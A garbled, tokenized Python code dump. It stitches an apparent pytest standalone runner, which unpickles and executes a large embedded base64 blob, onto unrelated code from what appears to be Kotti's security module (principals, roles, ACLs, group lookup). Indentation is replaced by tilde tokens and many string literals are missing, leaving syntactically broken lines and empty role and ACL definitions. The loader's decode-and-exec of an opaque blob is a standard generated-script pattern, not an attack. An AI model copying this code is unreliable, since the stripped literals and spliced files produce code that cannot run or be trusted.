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\n""" \n 
\n 
import sys \n 
import base64 \n 
import zlib \n 
\n 
class DictImporter ( object ) : \n 
~~~ def __init__ ( self , sources ) : \n 
~~~ self . sources = sources \n 
\n 
~~ def find_module ( self , fullname , path = None ) : \n 
~~~ if fullname == "argparse" and sys . version_info >= ( 2 , 7 ) : \n 
# we were generated with <python2.7 (which pulls in argparse) \n 
# but we are running now on a stdlib which has it, so use that. \n 
~~~ return None \n 
~~ if fullname in self . sources : \n 
~~~ return self \n 
~~ if fullname + in self . sources : \n 
~~~ return self \n 
~~ return None \n 
\n 
~~ def load_module ( self , fullname ) : \n 
# print "load_module:",  fullname \n 
~~~ from types import ModuleType \n 
try : \n 
~~~ s = self . sources [ fullname ] \n 
is_pkg = False \n 
~~ except KeyError : \n 
~~~ s = self . sources [ fullname + ] \n 
is_pkg = True \n 
\n 
~~ co = compile ( s , fullname , ) \n 
module = sys . modules . setdefault ( fullname , ModuleType ( fullname ) ) \n 
module . __file__ = "%s/%s" % ( __file__ , fullname ) \n 
module . __loader__ = self \n 
if is_pkg : \n 
~~~ module . __path__ = [ fullname ] \n 
\n 
~~ do_exec ( co , module . __dict__ ) # noqa \n 
return sys . modules [ fullname ] \n 
\n 
~~ def get_source ( self , name ) : \n 
~~~ res = self . sources . get ( name ) \n 
if res is None : \n 
~~~ res = self . sources . get ( name + ) \n 
~~ return res \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ try : \n 
~~~ import pkg_resources # noqa \n 
~~ except ImportError : \n 
~~~ sys . stderr . write ( "ERROR: setuptools not installed\\n" ) \n 
sys . exit ( 2 ) \n 
~~ if sys . version_info >= ( 3 , 0 ) : \n 
~~~ exec ( "def do_exec(co, loc): exec(co, loc)\\n" ) \n 
import pickle \n 
sources = sources . encode ( "ascii" ) # ensure bytes \n 
sources = pickle . loads ( zlib . decompress ( base64 . decodebytes ( sources ) ) ) \n 
~~ else : \n 
~~~ import cPickle as pickle \n 
exec ( "def do_exec(co, loc): exec co in loc\\n" ) \n 
sources = pickle . loads ( zlib . decompress ( base64 . decodestring ( sources ) ) ) \n 
\n 
~~ importer = DictImporter ( sources ) \n 
sys . meta_path . insert ( 0 , importer ) \n 
entry = "import pytest; raise SystemExit(pytest.cmdline.main())" \n 
do_exec ( entry , locals ( ) ) # noqa \n 
# -*- coding: utf-8 -*- \n 
~~ from __future__ import with_statement \n 
from contextlib import contextmanager \n 
from datetime import datetime \n 
from UserDict import DictMixin \n 
\n 
import bcrypt \n 
from pyramid . location import lineage \n 
from pyramid . security import view_execution_permitted \n 
from six import string_types \n 
from sqlalchemy import Boolean , bindparam \n 
from sqlalchemy import Column \n 
from sqlalchemy import DateTime \n 
from sqlalchemy import func \n 
from sqlalchemy import Integer \n 
from sqlalchemy import Unicode \n 
from sqlalchemy . orm . exc import NoResultFound \n 
from sqlalchemy . sql . expression import and_ \n 
from sqlalchemy . sql . expression import or_ \n 
from zope . deprecation . deprecation import deprecated \n 
\n 
from kotti import Base \n 
from kotti import DBSession \n 
from kotti import get_settings \n 
from kotti . sqla import bakery \n 
from kotti . sqla import JsonType \n 
from kotti . sqla import MutationList \n 
from kotti . util import _ \n 
from kotti . util import request_cache \n 
from kotti . util import DontCache \n 
\n 
\n 
def get_principals ( ) : \n 
~~~ return get_settings ( ) [ ] [ 0 ] ( ) \n 
\n 
\n 
~~ @ request_cache ( lambda request : None ) \n 
def get_user ( request ) : \n 
~~~ userid = request . unauthenticated_userid \n 
return get_principals ( ) . get ( userid ) \n 
\n 
\n 
~~ def has_permission ( permission , context , request ) : \n 
~~~ """ Check if the current request has a permission on the given context.\n\n    .. deprecated:: 0.9\n\n    :param permission: permission to check for\n    :type permission: str\n\n    :param context: context that should be checked for the given permission\n    :type context: :class:``kotti.resources.Node``\n\n    :param request: current request\n    :type request: :class:`kotti.request.Request`\n\n    :result: ``True`` if request has the permission, ``False`` else\n    :rtype: bool\n    """ \n 
\n 
return request . has_permission ( permission , context ) \n 
\n 
\n 
~~ deprecated ( , \n 
u"kotti.security.has_permission is deprecated as of Kotti 1.0 and " \n 
u"will be no longer available starting with Kotti 2.0.  " \n 
u"Please use the has_permission method of request instead." ) \n 
\n 
\n 
class Principal ( Base ) : \n 
~~~ """A minimal \'Principal\' implementation.\n\n    The attributes on this object correspond to what one ought to\n    implement to get full support by the system.  You\'re free to add\n    additional attributes.\n\n      - As convenience, when passing \'password\' in the initializer, it\n        is hashed using \'get_principals().hash_password\'\n\n      - The boolean \'active\' attribute defines whether a principal may\n        log in.  This allows the deactivation of accounts without\n        deleting them.\n\n      - The \'confirm_token\' attribute is set whenever a user has\n        forgotten their password.  This token is used to identify the\n        receiver of the email.  This attribute should be set to\n        \'None\' once confirmation has succeeded.\n    """ \n 
\n 
id = Column ( Integer , primary_key = True ) \n 
name = Column ( Unicode ( 100 ) , unique = True ) \n 
password = Column ( Unicode ( 100 ) ) \n 
active = Column ( Boolean ) \n 
confirm_token = Column ( Unicode ( 100 ) ) \n 
title = Column ( Unicode ( 100 ) , nullable = False ) \n 
email = Column ( Unicode ( 100 ) , unique = True ) \n 
groups = Column ( MutationList . as_mutable ( JsonType ) , nullable = False ) \n 
creation_date = Column ( DateTime ( ) , nullable = False ) \n 
last_login_date = Column ( DateTime ( ) ) \n 
\n 
__tablename__ = \n 
__mapper_args__ = dict ( \n 
order_by = name , \n 
) \n 
\n 
def __init__ ( self , name , password = None , active = True , confirm_token = None , \n 
title = u"" , email = None , groups = None ) : \n 
~~~ self . name = name \n 
if password is not None : \n 
~~~ password = get_principals ( ) . hash_password ( password ) \n 
~~ self . password = password \n 
self . active = active \n 
self . confirm_token = confirm_token \n 
self . title = title \n 
self . email = email \n 
if groups is None : \n 
~~~ groups = [ ] \n 
~~ self . groups = groups \n 
self . creation_date = datetime . now ( ) \n 
self . last_login_date = None \n 
\n 
~~ def __repr__ ( self ) : # pragma: no cover \n 
~~~ return . format ( self . name ) \n 
\n 
\n 
~~ ~~ class AbstractPrincipals ( object ) : \n 
~~~ """This class serves as documentation and defines what methods are\n    expected from a Principals database.\n\n    Principals mostly provides dict-like access to the principal\n    objects in the database.  In addition, there\'s the \'search\' method\n    which allows searching users and groups.\n\n    \'hash_password\' is for initial hashing of a clear text password,\n    while \'validate_password\' is used by the login to see if the\n    entered password matches the hashed password that\'s already in the\n    database.\n\n    Use the \'kotti.principals\' settings variable to override Kotti\'s\n    default Principals implementation with your own.\n    """ \n 
def __getitem__ ( self , name ) : \n 
~~~ """Return the Principal object with the id \'name\'.\n        """ \n 
\n 
~~ def __setitem__ ( self , name , principal ) : \n 
~~~ """Add a given Principal object to the database.\n\n        \'name\' is expected to the the same as \'principal.name\'.\n\n        \'principal\' may also be a dict of attributes.\n        """ \n 
\n 
~~ def __delitem__ ( self , name ) : \n 
~~~ """Remove the principal with the given name from the database.\n        """ \n 
\n 
~~ def keys ( self ) : \n 
~~~ """Return a list of principal ids that are in the database.\n        """ \n 
\n 
~~ def search ( self , ** kwargs ) : \n 
~~~ """Return an iterable with principal objects that correspond\n        to the search arguments passed in.\n\n        This example would return all principals with the id \'bob\':\n\n          get_principals().search(name=u\'bob\')\n\n        Here, we ask for all principals that have \'bob\' in either\n        their \'name\' or their \'title\'.  We pass \'*bob*\' instead of\n        \'bob\' to indicate that we want case-insensitive substring\n        matching:\n\n          get_principals().search(name=u\'*bob*\', title=u\'*bob*\')\n\n        This call should fail with AttributeError unless there\'s a\n        \'foo\' attribute on principal objects that supports search:\n\n          get_principals().search(name=u\'bob\', foo=u\'bar\')\n        """ \n 
\n 
~~ def hash_password ( self , password ) : \n 
~~~ """Return a hash of the given password.\n\n        This is what\'s stored in the database as \'principal.password\'.\n        """ \n 
\n 
~~ def validate_password ( self , clear , hashed ) : \n 
~~~ """Returns True if the clear text password matches the hash.\n        """ \n 
\n 
~~ ~~ ROLES = { \n 
: Principal ( , title = _ ( ) ) , \n 
: Principal ( , title = _ ( ) ) , \n 
: Principal ( , title = _ ( ) ) , \n 
: Principal ( , title = _ ( ) ) , \n 
} \n 
_DEFAULT_ROLES = ROLES . copy ( ) \n 
\n 
# These roles are visible in the sharing tab \n 
SHARING_ROLES = [ , , ] \n 
USER_MANAGEMENT_ROLES = SHARING_ROLES + [ ] \n 
_DEFAULT_SHARING_ROLES = SHARING_ROLES [ : ] \n 
_DEFAULT_USER_MANAGEMENT_ROLES = USER_MANAGEMENT_ROLES [ : ] \n 
\n 
# This is the ACL that gets set on the site root on creation.  Note \n 
\n 
# you are, then you should look at the permissions in workflow.zcml. \n 
SITE_ACL = [ \n 
[ , , [ ] ] , \n 
[ , , [ ] ] , \n 
[ , , [ , , , ] ] , \n 
[ , , [ , , , , ] ] , \n 
] \n 
\n 
\n 
def set_roles ( roles_dict ) : \n 
~~~ ROLES . clear ( ) \n 
ROLES . update ( roles_dict ) \n 
\n 
\n 
~~ def set_sharing_roles ( role_names ) : \n 
~~~ SHARING_ROLES [ : ] = role_names \n 
\n 
\n 
~~ def set_user_management_roles ( role_names ) : \n 
~~~ USER_MANAGEMENT_ROLES [ : ] = role_names \n 
\n 
\n 
~~ def reset_roles ( ) : \n 
~~~ ROLES . clear ( ) \n 
ROLES . update ( _DEFAULT_ROLES ) \n 
\n 
\n 
~~ def reset_sharing_roles ( ) : \n 
~~~ SHARING_ROLES [ : ] = _DEFAULT_SHARING_ROLES \n 
\n 
\n 
~~ def reset_user_management_roles ( ) : \n 
~~~ USER_MANAGEMENT_ROLES [ : ] = _DEFAULT_USER_MANAGEMENT_ROLES \n 
\n 
\n 
~~ def reset ( ) : \n 
~~~ reset_roles ( ) \n 
reset_sharing_roles ( ) \n 
reset_user_management_roles ( ) \n 
\n 
\n 
~~ class PersistentACLMixin ( object ) : \n 
~~~ def _get_acl ( self ) : \n 
~~~ if self . _acl is None : \n 
~~~ raise AttributeError ( ) \n 
~~ return self . _acl \n 
\n 
~~ def _set_acl ( self , value ) : \n 
~~~ self . _acl = value \n 
\n 
~~ def _del_acl ( self ) : \n 
~~~ self . _acl = None \n 
\n 
~~ __acl__ = property ( _get_acl , _set_acl , _del_acl ) \n 
\n 
\n 
~~ def _cachekey_list_groups_raw ( name , context ) : \n 
~~~ context_id = context is not None and getattr ( context , , id ( context ) ) \n 
return name , context_id \n 
\n 
\n 
~~ @ request_cache ( _cachekey_list_groups_raw ) \n 
def list_groups_raw ( name , context ) : \n 
~~~ """A set of group names in given ``context`` for ``name``.\n\n    Only groups defined in context will be considered, therefore no\n    global or inherited groups are returned.\n    """ \n 
\n 
from kotti . resources import Node \n 
\n 
if isinstance ( context , Node ) : \n 
~~~ return set ( \n 
r . group_name for r in context . local_groups \n 
if r . principal_name == name \n 
) \n 
~~ return set ( ) \n 
\n 
\n 
~~ def list_groups ( name , context = None ) : \n 
~~~ """List groups for principal with a given ``name``.\n\n    The optional ``context`` argument may be passed to check the list\n    of groups in a given context.\n    """ \n 
return list_groups_ext ( name , context ) [ 0 ] \n 
\n 
\n 
~~ def _cachekey_list_groups_ext ( name , context = None , _seen = None , _inherited = None ) : \n 
~~~ if _seen is not None or _inherited is not None : \n 
~~~ raise DontCache \n 
~~ else : \n 
~~~ context_id = getattr ( context , , id ( context ) ) \n 
return unicode ( name ) , context_id \n 
\n 
\n 
~~ ~~ @ request_cache ( _cachekey_list_groups_ext ) \n 
def list_groups_ext ( name , context = None , _seen = None , _inherited = None ) : \n 
~~~ name = unicode ( name ) \n 
groups = set ( ) \n 
recursing = _inherited is not None \n 
_inherited = _inherited or set ( ) \n 
\n 
# Add groups from principal db: \n 
principal = get_principals ( ) . get ( name ) \n 
if principal is not None : \n 
~~~ groups . update ( principal . groups ) \n 
if context is not None or ( context is None and _seen is not None ) : \n 
~~~ _inherited . update ( principal . groups ) \n 
\n 
~~ ~~ if _seen is None : \n 
~~~ _seen = { name } \n 
\n 
# Add local groups: \n 
~~ if context is not None : \n 
~~~ items = lineage ( context ) \n 
for idx , item in enumerate ( items ) : \n 
~~~ group_names = [ i for i in list_groups_raw ( name , item ) \n 
if i not in _seen ] \n 
groups . update ( group_names ) \n 
if recursing or idx != 0 : \n 
~~~ _inherited . update ( group_names ) \n 
\n 
~~ ~~ ~~ new_groups = groups - _seen \n 
_seen . update ( new_groups ) \n 
for group_name in new_groups : \n 
~~~ g , i = list_groups_ext ( \n 
group_name , context , _seen = _seen , _inherited = _inherited ) \n 
groups . update ( g ) \n 
